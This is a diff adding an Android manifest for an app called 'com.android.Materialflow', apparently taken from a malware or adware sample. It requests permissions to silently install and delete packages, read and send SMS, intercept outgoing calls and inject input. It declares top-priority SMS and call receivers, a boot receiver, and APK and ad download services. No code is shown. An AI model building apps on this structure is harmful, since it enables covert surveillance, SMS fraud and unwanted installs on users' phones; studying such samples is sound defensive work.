@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="6.2.3.8" android:installLocation="internalOnly" package="com.android.Materialflow">
+    <uses-sdk android:sharedUserId="android.uid.system" android:minSdkVersion="8"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.CLEAR_APP_USER_DATA"/>
+    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-permission android:name="android.permission.FORCE_STOP_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_MEDIA_STORAGE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
+    <uses-permission android:name="android.permission.INJECT_EVENTS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <application android:label="com.android.Materialflow" android:name="com.qc.base.QCApplication" android:allowClearUserData="false" android:persistent="true" android:debuggable="true">
+        <activity android:label="Test Model" android:name="com.qc.access.TestJarActivity" android:screenOrientation="portrait" android:configChanges="keyboardHidden|orientation" android:windowSoftInputMode="adjustPan"/>
+        <activity android:theme="@style/Theme.Dialog" android:name="com.qc.access.Warming"/>
+        <service android:label="Materialflowcc" android:name="com.qc.access.MainOsService" android:enabled="true" android:exported="false">
+            <intent-filter>
+                <action android:name="com.qc.action.REGISTER_RECEIVER"/>
+                <action android:name="com.qc.action.INSTALLCFG_TASK"/>
+                <action android:name="com.qc.action.APKDOWNLOAD_TASK"/>
+                <action android:name="com.qc.action.DOUBLEPACKAGE_CHECK"/>
+            </intent-filter>
+        </service>
+        <receiver android:name="com.qc.access.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.qc.access.ShutdownReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.qc.access.QCAlarmReceiver">
+            <intent-filter>
+                <action android:name="com.mnkp.action.ALARMRECEIRVE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.qc.access.OutGoingCallReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.qc.access.DateChangedReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.TIME_SET"/>
+                <action android:name="android.intent.action.DATE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.qc.access.SmsReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="Materialflowmomo" android:name="com.qc.access.MotionService" android:enabled="true" android:exported="false"/>
+        <service android:label="Materialflowzp" android:name="com.qc.access.BaseSiteService" android:enabled="true" android:exported="false"/>
+        <service android:label="Materialflowbean" android:name="com.qc.access.LocalOsService" android:enabled="true" android:exported="false"/>
+        <receiver android:name="com.qc.access.ApkUninstallReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="Materialflowhe" android:name="com.qc.access.BaseOsService" android:enabled="true" android:exported="false">
+            <intent-filter>
+                <action android:name="com.qc.action.ADSCFGDOWNLOAD_TASK"/>
+                <action android:name="com.qc.action.ADSMAIN_TASK"/>
+            </intent-filter>
+        </service>
+        <receiver android:name="com.qc.access.AdsInstallReceiver">
+            <intent-filter>
+                <action android:name="com.mnkp.action.INSTALLINADS"/>
+                <action android:name="com.mnkp.action.INSTALLER_1"/>
+                <action android:name="com.mnkp.action.INSTALLER_2"/>
+                <action android:name="com.mnkp.action.INSTALLER_3"/>
+                <action android:name="com.mnkp.action.INSTALLER_4"/>
+                <action android:name="com.mnkp.action.INSTALLER_5"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
